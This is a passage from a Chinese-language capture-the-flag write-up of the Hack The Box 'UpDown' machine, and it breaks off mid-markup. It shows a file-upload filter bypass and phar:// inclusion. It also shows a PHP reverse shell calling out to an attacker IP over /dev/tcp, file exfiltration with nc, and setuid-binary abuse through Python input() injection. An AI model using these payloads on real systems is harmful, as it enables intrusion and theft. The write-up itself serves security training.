<span class="hljs-number">22</span>:<span class="hljs-number">26</span> stylesheet.css<br><br>┌──(kali㉿offsec)-[~/Desktop/git-dumper-py/temp]<br>└─$ cat .htaccess              <br>SetEnvIfNoCase Special-Dev <span class="hljs-string">&quot;only4dev&quot;</span> Required-Header<br>Order Deny,Allow<br>Deny from All<br>Allow from env=Required-Header<br><br>SetEnvIfNoCase特殊开发“only4dev”必需标题<br>订单拒绝、允许<br>全部拒绝<br>Allow from env=必需标头<br><br>Special-Dev <span class="hljs-string">&quot;only4dev&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>9、这里显示，添加上这个文件头，就可以访问地址，结合上面发现的Dev子域名，可以尝试下</p>
+<p><code>http://dev.siteisup.htb/</code></p>
+<p><img src="http://sh1yan.top/photo/UpDown-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/UpDown-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
+<p>10、发现了可以上传文件的页面，结合 .git 源码里发现的情况，可以上传扩展名为 png 的 zip 文件，进行绕过</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">&#x27;check&#x27;</span>])&#123;<br>  <br>        # File size must be less than <span class="hljs-number">10</span>kb.<br>        <span class="hljs-keyword">if</span> ($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">10000</span>) &#123;<br>        die(<span class="hljs-string">&quot;File too large!&quot;</span>);<br>    &#125;<br>        $file = $_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <br>        # Check <span class="hljs-keyword">if</span> extension is allowed.<br>        $ext = getExtension($file);<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i&quot;</span>,$ext))&#123;<br>                die(<span class="hljs-string">&quot;Extension not allowed!&quot;</span>);<br>        &#125;<br>  <br>        # Create directory to upload our file.<br>        $dir = <span class="hljs-string">&quot;uploads/&quot;</span>.md5(time()).<span class="hljs-string">&quot;/&quot;</span>;<br>        <span class="hljs-keyword">if</span>(!is_dir($dir))&#123;<br>        mkdir($dir, <span class="hljs-number">0770</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br><br><br>&lt;b&gt;This is only <span class="hljs-keyword">for</span> developers&lt;/b&gt;<br>&lt;br&gt;<br>&lt;a href=<span class="hljs-string">&quot;?page=admin&quot;</span>&gt;Admin Panel&lt;/a&gt;<br>&lt;?php<br>        define(<span class="hljs-string">&quot;DIRECTACCESS&quot;</span>,<span class="hljs-literal">false</span>);<br>        $page=$_GET[<span class="hljs-string">&#x27;page&#x27;</span>];<br>        <span class="hljs-keyword">if</span>($page &amp;&amp; !preg_match(<span class="hljs-string">&quot;/bin|usr|home|var|etc/i&quot;</span>,$page))&#123;<br>                include($_GET[<span class="hljs-string">&#x27;page&#x27;</span>] . <span class="hljs-string">&quot;.php&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>                include(<span class="hljs-string">&quot;checker.php&quot;</span>);<br>        &#125;       <br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/UpDown-htb-writeup/8.png" srcset="/img/loading.gif" lazyload></p>
+<p>11、构造压缩包文件，并开始上传</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ cat pipinfo.php <br>&lt;?php <span class="hljs-title function_">phpinfo</span><span class="hljs-params">()</span>;?&gt;<br><span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.39</span><br>                                                                                           <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ zip pipinfo.png pipinfo.php<br>  adding: pipinfo.php (deflated <span class="hljs-number">6</span>%)<br></code></pre></td></tr></table></figure>
+
+<p><code>http://dev.siteisup.htb/uploads/9df78c6c215ea04b53719ab74e46d47a/pipinfo.png</code></p>
+<p><img src="http://sh1yan.top/photo/UpDown-htb-writeup/9.png" srcset="/img/loading.gif" lazyload></p>
+<p>12、在上传的 zip 中执行 phpinfo，phar:&#x2F;&#x2F;path</p>
+<p><code>http://dev.siteisup.htb/?page=phar://uploads/9df78c6c215ea04b53719ab74e46d47a/pipinfo.png/pipinfo</code></p>
+<p><img src="http://sh1yan.top/photo/UpDown-htb-writeup/10.png" srcset="/img/loading.gif" lazyload></p>
+<p>13、接下来就是构造反弹shell进行上传了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?php<br>$proc=proc_open(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp;/dev/tcp/10.10.14.39/443 0&gt;&amp;1&#x27;&quot;</span>,<br>  <span class="hljs-built_in">array</span>(<br>    <span class="hljs-built_in">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>),<br>    <span class="hljs-built_in">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<br>    <span class="hljs-built_in">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br>  ),<br>  $pipes);<br>print <span class="hljs-title function_">stream_get_contents</span><span class="hljs-params">($pipes[<span class="hljs-number">1</span>])</span>;<br>?&gt;<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ cat shell.php              <br>&lt;?php<br>$proc=proc_open(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp;/dev/tcp/10.10.14.39/443 0&gt;&amp;1&#x27;&quot;</span>,<br>  <span class="hljs-built_in">array</span>(<br>    <span class="hljs-built_in">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>),<br>    <span class="hljs-built_in">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<br>    <span class="hljs-built_in">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br>  ),<br>  $pipes);<br>print <span class="hljs-title function_">stream_get_contents</span><span class="hljs-params">($pipes[<span class="hljs-number">1</span>])</span>;<br>?&gt;<br>                             <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ zip shell.png shell.php    <br>  adding: shell.php (deflated <span class="hljs-number">33</span>%)<br><br><br><br><br><br><br><br><br></code></pre></td></tr></table></figure>
+
+<p><code>http://dev.siteisup.htb/uploads/7c6eba507d508a9a10bf42e63a81cef8/shell.png</code></p>
+<p><code>http://dev.siteisup.htb/?page=phar://uploads/7c6eba507d508a9a10bf42e63a81cef8/shell.png/shell</code></p>
+<p><img src="http://sh1yan.top/photo/UpDown-htb-writeup/11.png" srcset="/img/loading.gif" lazyload></p>
+<p>14、成功获取到初始的shell了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ rlwrap nc -lnvp <span class="hljs-number">443</span><br>listening on [any] <span class="hljs-number">443</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.39</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.177</span>] <span class="hljs-number">52472</span><br>bash: cannot <span class="hljs-built_in">set</span> terminal process <span class="hljs-title function_">group</span> <span class="hljs-params">(<span class="hljs-number">909</span>)</span>: Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control in this shell<br>www-data@updown:/var/www/dev$ id<br>id<br>uid=<span class="hljs-number">33</span>(www-data) gid=<span class="hljs-number">33</span>(www-data) groups=<span class="hljs-number">33</span>(www-data)<br>www-data@updown:/var/www/dev$ ls -la /home<br>ls -la /home<br>total <span class="hljs-number">12</span><br>drwxr-xr-x  <span class="hljs-number">3</span> root      root      <span class="hljs-number">4096</span> Jun <span class="hljs-number">22</span>  <span class="hljs-number">2022</span> .<br>drwxr-xr-x <span class="hljs-number">19</span> root      root      <span class="hljs-number">4096</span> Aug  <span class="hljs-number">3</span>  <span class="hljs-number">2022</span> ..<br>drwxr-xr-x  <span class="hljs-number">6</span> developer developer <span class="hljs-number">4096</span> Aug <span class="hljs-number">30</span>  <span class="hljs-number">2022</span> developer<br>www-data@updown:/var/www/dev$ ls -la /home/developer<br>ls -la /home/developer<br>total <span class="hljs-number">40</span><br>drwxr-xr-x <span class="hljs-number">6</span> developer developer <span class="hljs-number">4096</span> Aug <span class="hljs-number">30</span>  <span class="hljs-number">2022</span> .<br>drwxr-xr-x <span class="hljs-number">3</span> root      root      <span class="hljs-number">4096</span> Jun <span class="hljs-number">22</span>  <span class="hljs-number">2022</span> ..<br>lrwxrwxrwx <span class="hljs-number">1</span> root      root         <span class="hljs-number">9</span> Jul <span class="hljs-number">27</span>  <span class="hljs-number">2022</span> .bash_history -&gt; /dev/null<br>-rw-r--r-- <span class="hljs-number">1</span> developer developer  <span class="hljs-number">231</span> Jun <span class="hljs-number">22</span>  <span class="hljs-number">2022</span> .bash_logout<br>-rw-r--r-- <span class="hljs-number">1</span> developer developer <span class="hljs-number">3771</span> Feb <span class="hljs-number">25</span>  <span class="hljs-number">2020</span> .bashrc<br>drwx------ <span class="hljs-number">2</span> developer developer <span class="hljs-number">4096</span> Aug <span class="hljs-number">30</span>  <span class="hljs-number">2022</span> .cache<br>drwxrwxr-x <span class="hljs-number">3</span> developer developer <span class="hljs-number">4096</span> Aug  <span class="hljs-number">1</span>  <span class="hljs-number">2022</span> .local<br>-rw-r--r-- <span class="hljs-number">1</span> developer developer  <span class="hljs-number">807</span> Feb <span class="hljs-number">25</span>  <span class="hljs-number">2020</span> .profile<br>drwx------ <span class="hljs-number">2</span> developer developer <span class="hljs-number">4096</span> Aug  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> .ssh<br>drwxr-x--- <span class="hljs-number">2</span> developer www-data  <span class="hljs-number">4096</span> Jun <span class="hljs-number">22</span>  <span class="hljs-number">2022</span> dev<br>-rw-r----- <span class="hljs-number">1</span> root      developer   <span class="hljs-number">33</span> Apr <span class="hljs-number">28</span> <span class="hljs-number">06</span>:<span class="hljs-number">05</span> user.txt<br>www-data@updown:/var/www/dev$ cat /home/developer/user.txt<br>cat /home/developer/user.txt<br>cat: /home/developer/user.txt: Permission denied<br>www-data@updown:/var/www/dev$ <br></code></pre></td></tr></table></figure>
+
+<p>15、经过分析发现了目标用户下有个文件，可执行文件，通过nc进行下载</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">www-data@updown:/var/www/html/dev$ cd /home/developer/dev<br>cd /home/developer/dev<br>www-data@updown:/home/developer/dev$ ls -la<br>ls -la<br>total <span class="hljs-number">32</span><br>drwxr-x--- <span class="hljs-number">2</span> developer www-data   <span class="hljs-number">4096</span> Jun <span class="hljs-number">22</span>  <span class="hljs-number">2022</span> .<br>drwxr-xr-x <span class="hljs-number">6</span> developer developer  <span class="hljs-number">4096</span> Aug <span class="hljs-number">30</span>  <span class="hljs-number">2022</span> ..<br>-rwsr-x--- <span class="hljs-number">1</span> developer www-data  <span class="hljs-number">16928</span> Jun <span class="hljs-number">22</span>  <span class="hljs-number">2022</span> siteisup<br>-rwxr-x--- <span class="hljs-number">1</span> developer www-data    <span class="hljs-number">154</span> Jun <span class="hljs-number">22</span>  <span class="hljs-number">2022</span> siteisup_test.py<br>www-data@updown:/home/developer/dev$ <br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ nc -lvnp <span class="hljs-number">80</span> &gt; siteisup<br>listening on [any] <span class="hljs-number">80</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.39</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.177</span>] <span class="hljs-number">36696</span><br>^C<br><br>www-data@updown:/home/developer/dev$ nc -v <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.39</span> <span class="hljs-number">80</span> &lt; ./siteisup<br>nc -v <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.39</span> <span class="hljs-number">80</span> &lt; ./siteisup<br>Connection to <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.39</span> <span class="hljs-number">80</span> port [tcp/http] succeeded!<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ nc -lvnp <span class="hljs-number">80</span> &gt; siteisup_test.py<br>listening on [any] <span class="hljs-number">80</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.39</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.177</span>] <span class="hljs-number">36698</span><br>^C<br>www-data@updown:/home/developer/dev$ nc -v <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.39</span> <span class="hljs-number">80</span> &lt; ./siteisup_test.py<br>&lt;oper/dev$ nc -v <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.39</span> <span class="hljs-number">80</span> &lt; ./siteisup_test.py<br>Connection to <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.39</span> <span class="hljs-number">80</span> port [tcp/http] succeeded!<br>www-data@updown:/home/developer/dev$ <br></code></pre></td></tr></table></figure>
+
+<p>16、开始分析下载的文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ file siteisup_test.py <br>siteisup_test.py: ASCII text<br>                                                                                            <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ cat siteisup_test.py<br>import requests<br><br>url = input(<span class="hljs-string">&quot;Enter URL here:&quot;</span>)<br>page = requests.get(url)<br><span class="hljs-keyword">if</span> page.status_code == <span class="hljs-number">200</span>:<br>        print <span class="hljs-string">&quot;Website is up&quot;</span><br><span class="hljs-keyword">else</span>:<br>        print <span class="hljs-string">&quot;Website is down&quot;</span><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ file siteisup        <br>siteisup: ELF <span class="hljs-number">64</span>-bit LSB pie executable, x86<span class="hljs-number">-64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="hljs-number">-64.</span>so<span class="hljs-number">.2</span>, BuildID[sha1]=b5bbc1de286529f5291b48db8202eefbafc92c1f, <span class="hljs-keyword">for</span> GNU/Linux <span class="hljs-number">3.2</span><span class="hljs-number">.0</span>, not stripped<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ strings siteisup                    <br>/lib64/ld-linux-x86<span class="hljs-number">-64.</span>so<span class="hljs-number">.2</span><br>libc.so<span class="hljs-number">.6</span><br><span class="hljs-built_in">puts</span><br>setresgid<br>setresuid<br>system<br>getegid<br>geteuid<br>__cxa_finalize<br>__libc_start_main<br>GLIBC_2<span class="hljs-number">.2</span><span class="hljs-number">.5</span><br>_ITM_deregisterTMCloneTable<br>__gmon_start__<br>_ITM_registerTMCloneTable<br>u+UH<br>[]A\A]A^A_<br>Welcome to <span class="hljs-string">&#x27;siteisup.htb&#x27;</span> application<br>/usr/bin/python /home/developer/dev/siteisup_test.py<br>:*<span class="hljs-number">3</span>$<span class="hljs-string">&quot;</span><br><span class="hljs-string">GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0</span><br><span class="hljs-string">crtstuff.c</span><br><span class="hljs-string">deregister_tm_clones</span><br><span class="hljs-string">__do_global_dtors_aux</span><br><span class="hljs-string">completed.8061</span><br><span class="hljs-string">__do_global_dtors_aux_fini_array_entry</span><br><span class="hljs-string">frame_dummy</span><br><span class="hljs-string">__frame_dummy_init_array_entry</span><br><span class="hljs-string">siteisup.c</span><br><span class="hljs-string">__FRAME_END__</span><br><span class="hljs-string">__init_array_end</span><br><span class="hljs-string">_DYNAMIC</span><br><span class="hljs-string">__init_array_start</span><br><span class="hljs-string">__GNU_EH_FRAME_HDR</span><br><span class="hljs-string">_GLOBAL_OFFSET_TABLE_</span><br><span class="hljs-string">__libc_csu_fini</span><br><span class="hljs-string">_ITM_deregisterTMCloneTable</span><br><span class="hljs-string">puts@@GLIBC_2.2.5</span><br><span class="hljs-string">setresuid@@GLIBC_2.2.5</span><br><span class="hljs-string">_edata</span><br><span class="hljs-string">setresgid@@GLIBC_2.2.5</span><br><span class="hljs-string">system@@GLIBC_2.2.5</span><br><span class="hljs-string">geteuid@@GLIBC_2.2.5</span><br><span class="hljs-string">__libc_start_main@@GLIBC_2.2.5</span><br><span class="hljs-string">__data_start</span><br><span class="hljs-string">__gmon_start__</span><br><span class="hljs-string">__dso_handle</span><br><span class="hljs-string">_IO_stdin_used</span><br><span class="hljs-string">__libc_csu_init</span><br><span class="hljs-string">getegid@@GLIBC_2.2.5</span><br><span class="hljs-string">__bss_start</span><br><span class="hljs-string">main</span><br><span class="hljs-string">__TMC_END__</span><br><span class="hljs-string">_ITM_registerTMCloneTable</span><br><span class="hljs-string">__cxa_finalize@@GLIBC_2.2.5</span><br><span class="hljs-string">.symtab</span><br><span class="hljs-string">.strtab</span><br><span class="hljs-string">.shstrtab</span><br><span class="hljs-string">.interp</span><br><span class="hljs-string">.note.gnu.property</span><br><span class="hljs-string">.note.gnu.build-id</span><br><span class="hljs-string">.note.ABI-tag</span><br><span class="hljs-string">.gnu.hash</span><br><span class="hljs-string">.dynsym</span><br><span class="hljs-string">.dynstr</span><br><span class="hljs-string">.gnu.version</span><br><span class="hljs-string">.gnu.version_r</span><br><span class="hljs-string">.rela.dyn</span><br><span class="hljs-string">.rela.plt</span><br><span class="hljs-string">.init</span><br><span class="hljs-string">.plt.got</span><br><span class="hljs-string">.plt.sec</span><br><span class="hljs-string">.text</span><br><span class="hljs-string">.fini</span><br><span class="hljs-string">.rodata</span><br><span class="hljs-string">.eh_frame_hdr</span><br><span class="hljs-string">.eh_frame</span><br><span class="hljs-string">.init_array</span><br><span class="hljs-string">.fini_array</span><br><span class="hljs-string">.dynamic</span><br><span class="hljs-string">.data</span><br><span class="hljs-string">.bss</span><br><span class="hljs-string">.comment</span><br></code></pre></td></tr></table></figure>
+
+<p>17、这里发现，疑似这个程序会运行这个Python脚本</p>
+<p><code>__import__(&#39;os&#39;).system(&#39;id&#39;)</code></p>
+<p><code>__import__(&#39;os&#39;).system(&#39;bash&#39;)</code></p>
+<p>18、在shell环境中运行一下看看</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">www-data@updown:/home/developer/dev$ ./siteisup<br>./siteisup<br>__import__(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;id&#x27;</span>)<br>uid=<span class="hljs-number">1002</span>(developer) gid=<span class="hljs-number">33</span>(www-data) groups=<span class="hljs-number">33</span>(www-data)<br>Enter URL here:Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;/home/developer/dev/siteisup_test.py&quot;</span>, line <span class="hljs-number">4</span>, in &lt;module&gt;<br>    page = requests.get(url)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python2.7/dist-packages/requests/api.py&quot;</span>, line <span class="hljs-number">75</span>, in get<br>    <span class="hljs-keyword">return</span> request(<span class="hljs-string">&#x27;get&#x27;</span>, url, params=params, **kwargs)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python2.7/dist-packages/requests/api.py&quot;</span>, line <span class="hljs-number">61</span>, in request<br>    <span class="hljs-keyword">return</span> session.request(method=method, url=url, **kwargs)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python2.7/dist-packages/requests/sessions.py&quot;</span>, line <span class="hljs-number">515</span>, in request<br>    prep = self.prepare_request(req)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python2.7/dist-packages/requests/sessions.py&quot;</span>, line <span class="hljs-number">453</span>, in prepare_request<br>    hooks=merge_hooks(request.hooks, self.hooks),<br>  File <span class="hljs-string">&quot;/usr/local/lib/python2.7/dist-packages/requests/models.py&quot;</span>, line <span class="hljs-number">318</span>, in prepare<br>    self.prepare_url(url, params)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python2.7/dist-packages/requests/models.py&quot;</span>, line <span class="hljs-number">392</span>, in prepare_url<br>    raise MissingSchema(error)<br>requests.exceptions.MissingSchema: Invalid URL <span class="hljs-string">&#x27;0&#x27;</span>: No scheme supplied. Perhaps you meant http:<span class="hljs-comment">//0?</span><br>Welcome to <span class="hljs-string">&#x27;siteisup.htb&#x27;</span> application<br><br>www-data@updown:/home/developer/dev$ <br></code></pre></td></tr></table></figure>
+
+<p>19、看来可以利用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">www-data@updown:/home/developer/dev$ ./siteisup<br>./siteisup<br>__import__(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;bash&#x27;</span>)<br><br>id<br>uid=<span class="hljs-number">1002</span>(developer) gid=<span class="hljs-number">33</span>(www-data) groups=<span class="hljs-number">33</span>(www-data)<br>python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>developer@updown:/home/developer/dev$ id<br>id<br>uid=<span class="hljs-number">1002</span>(developer) gid=<span class="hljs-number">33</span>(www-data) groups=<span class="hljs-number">33</span>(www-data)<br>developer@updown:/home/developer/dev$ <br></code></pre></td></tr></table></figure>
+
+<p>20、到这里就获取到了另一个用户的shell了，为了提高shell的可枚举性，我们把ssh的秘钥给弄了下来，并成功登录上了用户</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span 